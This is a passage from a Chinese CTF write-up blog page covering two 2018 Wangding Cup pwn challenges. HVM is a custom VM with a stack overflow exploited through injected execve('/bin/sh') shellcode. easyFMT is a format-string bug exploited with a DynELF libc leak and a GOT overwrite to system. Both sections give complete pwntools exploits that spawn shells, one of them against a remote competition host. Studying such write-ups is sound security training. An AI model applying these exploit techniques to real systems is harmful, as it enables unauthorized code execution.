*)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x19u:</span><br><span class="line">        exit(0);                                &#x2F;&#x2F; exit(0)</span><br><span class="line">        return result;</span><br><span class="line">      case 0x1Au:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; mov rsi,n</span><br><span class="line">        vm_rsi &#x3D; (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中调用syscall会将虚拟寄存器ax,bx,cx,dx,si,di传入真实寄存器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000056544247EE9A mov     rax, cs:vm_rax                  ; jumptable 0000000000000AF9 case 14</span><br><span class="line">.text:000056544247EEA1 mov     rbx, cs:vm_rbx</span><br><span class="line">.text:000056544247EEA8 mov     rcx, cs:vm_rcx</span><br><span class="line">.text:000056544247EEAF mov     rdx, cs:vm_rdx</span><br><span class="line">.text:000056544247EEB6 mov     rsi, cs:vm_rsi</span><br><span class="line">.text:000056544247EEBD mov     rdi, cs:vm_rdi</span><br><span class="line">.text:000056544247EEC4 syscall</span><br></pre></td></tr></table></figure>
+<p>最后对照hvmbin解析后得到程序过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">push &quot;o\n\x00\x00&quot;</span><br><span class="line">push &#39;hell&#39;</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,6</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">push rip </span><br><span class="line">jmp 4*14</span><br><span class="line">push 0</span><br><span class="line">push &#39;bye\n&#39;</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,6</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">(jmp 4*14:)</span><br><span class="line">push rbp</span><br><span class="line">mov rsp,rbp</span><br><span class="line">sub rsp,0x30</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdi,0</span><br><span class="line">mov rdx,0xf0</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">ret (vm_base_addr+4*(off+3))</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h2><p>可以看到第二步接收输入过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rsp,rbp</span><br><span class="line">sub rsp,0x30</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdi,0</span><br><span class="line">mov rdx,0xf0</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">ret (vm_base_addr+4*(off+3))</span><br></pre></td></tr></table></figure>
+<p>其允许我们输入最大0xf0长度的数据，从而造成了溢出<br>且在这里call的实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push eip</span><br><span class="line">jmp ...</span><br></pre></td></tr></table></figure>
+<p>且入栈的eip为相对于vm_base_addr的偏移(且这里视为符号数):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_ip &#x3D; (__int64)vm_base_addr + 4 * ((signed int)convert(v0) + 3LL)</span><br></pre></td></tr></table></figure>
+<p><strong>而且这里虚拟代码段和栈段是通过两次连续的 mmap 得到的内存<br>其是连续的，故而其地址相对关系是固定的，因此可以通过覆盖偏移来劫持eip，最终跳转到读入的shellcode</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub rsp,0x38    ; 我们开始输入&quot;&#x2F;bin&#x2F;sh&quot;,&quot;sub rsp,0x38&quot;使rsp指向&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">mov rdi,esp</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rax,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>对应到vm中的实现为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;p32(0x0f)+p32(0x38000000)</span><br><span class="line">payload+&#x3D;p32(0x0d)</span><br><span class="line">payload+&#x3D;p32(4)+p32(0)</span><br><span class="line">payload+&#x3D;p32(0x1a)+p32(0)</span><br><span class="line">payload+&#x3D;p32(1)+p32(0x3b000000)</span><br><span class="line">payload+&#x3D;p32(0xe)</span><br><span class="line">payload &#x3D; payload.ljust(0x30,&#39;\x00&#39;)  &#x2F;&#x2F;缓冲区大小：0x30</span><br></pre></td></tr></table></figure>
+<p>填充完缓冲区，需要确定覆盖的bp与ip：<br>首先覆盖过程中保持bp不变，防止程序崩溃(直接覆盖为程序原来此处的bp即可)：<br>需要注意存在convert函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall convert(unsigned int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return (a1 &lt;&lt; 24) + ((a1 &lt;&lt; 8) &amp; 0xFF0000) + (((signed int)a1 &gt;&gt; 8) &amp; 0xFF00) + (a1 &gt;&gt; 24);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是为了<strong>实现Little-Endian与Big-Endian之间的转换<br>所以求出所要覆盖数据时，注意在这里需要转换成Big-Endian</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+&#x3D;flat(0x400,word_size&#x3D;32,endianness&#x3D;&#39;big&#39;)</span><br></pre></td></tr></table></figure>
+<p>在第二步返回时下断点，用当前数据列出关系式，解出需要覆盖的ip：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm_base_addr + 4 * ((signed int)convert(v0) + 3LL)&#x3D;00007FBAF8709FC8</span><br><span class="line">即：</span><br><span class="line">7FBAF870B000 + 4 * ((signed int)convert(v0) + 3LL)&#x3D;00007FBAF8709FC8</span><br></pre></td></tr></table></figure>
+<p>解出，需要覆盖为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flat(-0x411,word_size&#x3D;32,endianness&#x3D;&#39;big&#39;)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;hvm&quot;)</span><br><span class="line">p.recvuntil(&quot;hello\n&quot;)</span><br><span class="line">payload&#x3D;&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">payload+&#x3D;p32(0x0f)+p32(0x38000000)</span><br><span class="line">payload+&#x3D;p32(0x0d)</span><br><span class="line">payload+&#x3D;p32(4)+p32(0)</span><br><span class="line">payload+&#x3D;p32(0x1a)+p32(0)</span><br><span class="line">payload+&#x3D;p32(1)+p32(0x3b000000)</span><br><span class="line">payload+&#x3D;p32(0xe)</span><br><span class="line">payload &#x3D; payload.ljust(0x30,&#39;\x00&#39;)+flat(0x400,-0x411,word_size&#x3D;32,endianness&#x3D;&#39;big&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="easyFMT"><a href="#easyFMT" class="headerlink" title="easyFMT"></a>easyFMT</h1><h2 id="0x01-程序分析-amp-amp-漏洞"><a href="#0x01-程序分析-amp-amp-漏洞" class="headerlink" title="0x01 程序分析&amp;&amp;漏洞"></a>0x01 程序分析&amp;&amp;漏洞</h2><p>首先：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  read(0, &amp;buf, 0x64u);</span><br><span class="line">  printf(&amp;buf);</span><br><span class="line">  putchar(10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以无限次格式化字符串漏洞，不过题目中没有libc<br>原本猜测和第一场一样的环境，直接用本机的libc即可<br>这里没有函数返回，我们只能修改printf或者read的got表<br>先leak libc，计算system的函数地址,再修改某一函数GOT表为system来调用system(“/bin/sh”)即可<br>不过这里本地打到shell后远程失败<br>猜测是题目环境不一致了<br>想到之前看到过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;stackoverflow&#x2F;basic_rop&#x2F;#libc_1</span><br></pre></td></tr></table></figure>
+<p><strong>当我们能无次数限制地泄露任意地址<br>便可利用DynELF获取整个libc</strong><br>另一种方法：<br><strong>我们可以泄露出某一函数真实加载地址后使用LibcSearcher获得libc版本(主要原理是查找偏移的后几字节(因为载入地址一般最后末位是0000，所以不影响最后几字节的偏移))</strong><br>从而最终获取system_addr<br>这里可以leak printf的一个真实地址来查找libc的版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;find printf 0xf86a8020</span><br><span class="line">archive-old-eglibc (id libc6-i386_2.11.1-0ubuntu7.11_amd64)</span><br><span class="line">ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br></pre></td></tr></table></figure>
+<p>这里EXP采取DynELF来获取libc</p>
+<h2 id="0x02-EXP："><a href="#0x02-EXP：" class="headerlink" title="0x02 EXP："></a>0x02 EXP：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def leak(addr,length&#x3D;4):</span><br><span class="line">  ans&#x3D;&quot;&quot;</span><br><span class="line">  for i in range(length):</span><br><span class="line">     payload&#x3D;&quot;aaaa&quot;+&quot;%9$s&quot;+&quot;kiri&quot;+p32(addr+i)</span><br><span class="line">     p.sendline(payload)</span><br><span class="line">     p.recvuntil(&quot;aaaa&quot;)</span><br><span class="line">     s&#x3D;p.recvuntil(&quot;kir&quot;)[:-3]</span><br><span class="line">     if len(s)&#x3D;&#x3D;0:</span><br><span class="line">         ans+&#x3D;&quot;\x00&quot;</span><br><span class="line">     else:</span><br><span class="line">        ans+&#x3D;s[0]</span><br><span class="line">     p.recv()</span><br><span class="line">  return ans</span><br><span class="line">p&#x3D;remote(&quot;106.75.126.184&quot;,58579)</span><br><span class="line">#p&#x3D;process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">p.recvuntil(&quot;?\n&quot;)</span><br><span class="line">#p.sendline(&quot;%1$x&quot;)</span><br><span class="line">#s&#x3D;p.recvuntil(&quot;\n&quot;)</span><br><span class="line">dyn &#x3D; DynELF(leak, elf&#x3D;ELF(&#39;.&#x2F;pwn&#39;))</span><br><span class="line">system_addr&#x3D;dyn.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line">print hex(system_addr)</span><br><span class="line">#system_addr&#x3D;0x3ada0-0x018540+error_addr</span><br><span class="line">l&#x3D;system_addr&amp;0x0000ffff</span><br><span class="line">h&#x3D;(system_addr&amp;0x00ff0000)&gt;&gt;16</span><br><span class="line">print hex(l)</span><br><span class="line">print hex(h)</span><br><span class="line">payload&#x3D;p32(0x804a016)+p32(0x804a014)+&quot;%&quot;+str(h-8)+&quot;c&quot;+&quot;%6$hhn&quot;+&quot;%&quot;+str(l-h)+&quot;c&quot;+&quot;%7$hn&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh;&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HVM"><span class="toc-number">1.</span> <span class="toc-text">HVM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-程序分析"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-up"><span class="toc-number">1.1.2.</span> <span class="toc-text">set_up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vm-handle"><span class="toc-number">1.1.3.</span> <span class="toc-text">vm_handle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyFMT"><span class="toc-number">2.</span> <span class="toc-text">easyFMT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-程序分析-amp-amp-漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 程序分析&amp;&amp;漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-EXP："><span class="toc-number">2.2.</span> <span class="toc-text">0x02 EXP：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&text=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&is_video=false&description=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯第二场_HVM&amp;&amp;easyFMT&body=Check out this article: http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&name=网鼎杯第二场_HVM&amp;&amp;easyFMT&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
